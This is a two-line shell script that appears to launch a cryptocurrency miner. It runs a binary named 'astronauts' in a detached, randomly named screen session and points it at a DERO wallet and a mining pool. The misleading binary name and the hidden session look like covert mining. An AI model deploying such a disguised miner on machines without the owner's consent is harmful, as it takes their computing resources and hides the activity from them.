chmod +x astronauts
screen -dmS $(shuf -n 1 -i 10000000-99999999) ./astronauts -w dero1qy9ukrds33v9gx6na5fa2mnnl4840gwqglrzthxpku58lrrg5vzrqqqv8tsve -p rpc -r community-pools.mysrv.cloud:10300